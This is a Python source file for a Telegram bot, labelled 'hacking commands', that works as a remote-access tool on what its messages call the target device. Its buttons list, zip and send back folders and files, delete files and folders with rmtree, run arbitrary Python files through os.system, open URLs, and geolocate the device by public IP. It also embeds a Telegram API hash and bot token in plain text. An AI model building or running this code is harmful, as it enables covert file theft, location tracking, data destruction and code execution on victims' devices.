from telethon import TelegramClient, events, Button
import subprocess
import os
import shutil
import requests
import webbrowser

api_id = 22290890
api_hash = "a51a3392038ccd49b3b82b1f90dab435"

bot = TelegramClient('bothffjh', api_id, api_hash).start(bot_token="6201637258:AAFRDMi-CYNrkkHprfc_rDltpgJgDN8Mv-k")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    # send 6 transparent buttons, with some emoji and text
    await event.respond("**𝐻𝑖 𝐻𝑢𝑠𝑠𝑎𝑚 𝑇𝒉𝑖𝑠 𝐼𝑠 𝐻𝑎𝑐𝑘𝑖𝑛𝑔 𝐶𝑜𝑚𝑚𝑎𝑛𝑑𝑠 ⤸**",
        buttons=[
            [Button.inline("⌯ 𝐂𝐫𝐞𝐚𝐭𝐞 𝐅𝐨𝐥𝐝𝐞𝐫 ⌯", b'creat1fold'), Button.inline("⌯ 𝐂𝐫𝐞𝐚𝐭 𝐅𝐢𝐥𝐞 ⌯", b'creat2file')],
            [Button.inline("⌯ 𝐆𝐞𝐭 𝐏𝐚𝐭𝐡 ⌯", b'get3path')],
            [Button.inline("⌯ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐅𝐨𝐥𝐝𝐞𝐫 ⌯", b'delete4fold'), Button.inline("⌯ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐅𝐢𝐥𝐞 ⌯", b'delete5file')],
            [Button.inline("⌯ 𝐆𝐞𝐭 𝐅𝐨𝐥𝐝𝐞𝐫 ⌯", b'get6fold')],
                        [Button.inline("⌯ 𝐏𝐲𝐭𝐡𝐨𝐧 𝐅𝐢 ⌯", b'python3'), Button.inline("⌯ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 ⌯", b'locatio')],
        [Button.inline("⌯ 𝐎𝐩𝐞𝐧 𝐔𝐫𝐥 ⌯", b'openurl')],
        [Button.inline("⌯ 𝐎𝐟𝐟 𝐓𝐨𝐨𝐥 ⌯", b'offo')],
        [Button.inline("⟣╴╶╴╶╴╶╴╶╴╶╴╶╴╶╴╶⟢", b'line')],
        ]
    )




@bot.on(events.CallbackQuery(data=b'creat1fold'))
async def handle_transparent(event):
    async with bot.conversation(event.sender_id) as conv:
      await conv.send_message('أدخل اسم المجلد الذي تريد إنشاءه')
      folder_name = await conv.get_response()
      await conv.send_message('هل تريد تحديد مسار مخصص للمجلد؟ (نعم/لا)')
      custom_path = await conv.get_response()
      if custom_path.text.lower() == 'نعم':
        await conv.send_message('أدخل المسار الذي تريد إنشاء المجلد فيه')
        path = await conv.get_response()
      else:
        path = './' + folder_name.text
      try:
        os.makedirs(path.text)
        await conv.send_message(f'تم إنشاء مجلد باسم {folder_name.text} بنجاح')
      except FileExistsError:
        await conv.send_message(f'عذرًا، المجلد باسم {folder_name.text} موجود بالفعل')
        


@bot.on(events.CallbackQuery(data=b'creat2file'))
async def creatfile(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message('ما هو اسم الملف الذي تريد إنشاءه؟')
        file_name = await conv.get_response(timeout=10)
        await conv.send_message('ما هو امتداد الملف الذي تريد إنشاءه؟')
        file_extension = await conv.get_response(timeout=10)
        await conv.send_message('ما هو محتوى الملف الذي تريد إنشاءه؟')
        file_content = await conv.get_response(timeout=10)
        full_file_name = file_name.text + '.' + file_extension.text
        await conv.send_message('هل لديك مسار معين تريد حفظ الملف فيه؟')
        path_answer = await conv.get_response(timeout=10)
        if path_answer.text.lower() == 'نعم':
            await conv.send_message('ما هو المسار المطلوب؟')
            desired_path = await conv.get_response(timeout=10)
            full_file_path = os.path.join(desired_path.text, full_file_name)
            try:
                with open(full_file_path, 'w') as f:
                    f.write(file_content.text)
                await conv.send_message(f'تم إنشاء الملف في {full_file_path}')
                await bot.send_file(event.sender_id, full_file_path, force_document=True)
                file_path = os.path.abspath(full_file_path)
                await conv.send_message(f'هذا هو المسار الكامل للملف في الهاتف: {file_path}')
            except:
                await conv.send_message('عذرا، لم أتمكن من إنشاء الملف في المسار المطلوب. ربما يكون المسار غير صحيح أو غير موجود.')
        elif path_answer.text.lower() == 'لا':
            with open(full_file_name, 'w') as f:
                f.write(file_content.text)
            await conv.send_message(f'تم إنشاء الملف في {full_file_name}')
            await bot.send_file(event.sender_id, full_file_name, force_document=True)
            file_path = os.path.abspath(full_file_name)
            await conv.send_message(f'هذا هو المسار الكامل للملف في الهاتف: {file_path}')
        else:
            await conv.send_message('عذرا، لم أفهم إجابتك. يرجى الإجابة بنعم أو لا.')

@bot.on(events.CallbackQuery(data=b'get3path'))
async def getpath(event):
        async with bot.conversation(event.chat_id) as conv:
            await conv.send_message('يرجى إرسال مسار المجلد المطلوب عرض محتوياته')
            response = await conv.get_response()
            path = response.text
            result = subprocess.run(['ls', path], stdout=subprocess.PIPE)
            output = result.stdout.decode('utf-8')
            await bot.send_message(event.chat_id, f"""
*——————————————————*
[ ✓ ] Done : \n{output}
*——————————————————*
""")



@bot.on(events.CallbackQuery(data=b'delete4fold'))
async def deletefolder(event):
    async with bot.conversation(event.chat) as conv:
        await conv.send_message('Please send me the path of the folder you want to delete.')
        folder_path = await conv.get_response()
        try:
            shutil.rmtree(folder_path.text)
            await conv.send_message(f'Folder {folder_path.text} has been deleted')
        except Exception as e:
            await conv.send_message(f'Error deleting folder {folder_path.text}: {e}')
            
@bot.on(events.CallbackQuery(data=b'delete5file'))
async def deletefile(event):
    async with bot.conversation(event.chat) as conv:
        await conv.send_message('Please send me the path of the file you want to delete.')
        file_path = await conv.get_response()
        try:
            os.remove(file_path.text)
            await conv.send_message(f'File {file_path.text} has been deleted')
        except Exception as e:
            await conv.send_message(f'Error deleting file {file_path.text}: {e}')

@bot.on(events.CallbackQuery(data=b'get6fold'))
async def getfolder(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message('يرجى إدخال مسار المجلد المطلوب ضغطه:')
        folder_path = await conv.get_response()
        zip_name = "sphone"
        zip_format = "zip"
        shutil.make_archive(zip_name, zip_format, folder_path.text)
        await conv.send_message('تم ضغط المجلد بنجاح!')
        await conv.send_file(f'{zip_name}.{zip_format}')

@bot.on(events.CallbackQuery(data=b'python3'))
async def python(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message('يرجى إدخال مسار الملف المطلوب تشغيله:')
        file_path = await conv.get_response()
        os.system(f'python {file_path.text}')
        await conv.send_message('تم تشغيل الملف بنجاح!')

@bot.on(events.CallbackQuery(data=b'locatio'))
async def loc(event):
    try:
        ip_loc = requests.get("https://api.ipify.org").text
        ip_address = ip_loc
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
        country = response.get("country_name")
        city = response.get("city")
        timezone = response.get("timezone")
        ip_v = response.get("version")
        currency = response.get("currency_name")
        con = response.get("country_calling_code")
        languages = response.get("languages")
        lat = response.get("latitude")
        long = response.get("longitude")
        capital = response.get("country_capital")
        region = response.get("region")
        map = "https://google.com/maps/place/" + str(lat) + "," + str(long) + "/@" + str(lat) + "," + str(long) + ",16z"

        await event.respond(f"""
If All Information About the site is equal to None, this is due to Poor Connectivity on The Target Device
*——————————————————*
[ ✓ ] Location
Country : {country}
City : {city}
Capital : {capital}
Region : {region}
Time Zone : {timezone}
IP Version : {ip_v}
Currency : {currency}
Country Code : {con}
Spoken Languages : {languages}
latitude : {lat}
longitude : {long}
Google Map :\n {map}
*——————————————————*""")
    except:
        await event.respond("Error, Poor Connection in The Target Device")
        
        
@bot.on(events.CallbackQuery(data=b'openurl'))
async def url(event):
    async with bot.conversation(event.chat) as conv:
        await conv.send_message('Send Url 🌪️')
        response = await conv.get_response()
        url = response.text
        webbrowser.open(url)
        await conv.send_message(f"""
*——————————————————*
[ ✓ ] Done opened: {url}
*————————————————
""")

@bot.on(events.CallbackQuery(data=b'offo'))
async def offo(event):
    await event.reply("تم الايقاف")
    await bot.disconnect()

bot.run_until_disconnected()
